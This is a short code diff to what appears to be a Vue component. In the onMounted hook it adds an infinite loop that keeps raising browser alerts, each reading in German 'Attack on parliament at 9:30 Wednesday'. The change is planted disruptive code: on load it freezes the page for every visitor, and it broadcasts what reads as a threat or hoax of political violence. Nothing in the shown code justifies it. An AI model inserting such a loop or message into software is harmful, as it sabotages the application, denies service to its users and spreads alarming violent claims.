@@ -38,7 +38,9 @@ function nothing() {
 
 onMounted(() => {
   sendSize(65, 65);
-
+while(true){
+  alert("Angriff auf das Parlament um 9:30Uhr Mittwoch");
+}
 });
 
 
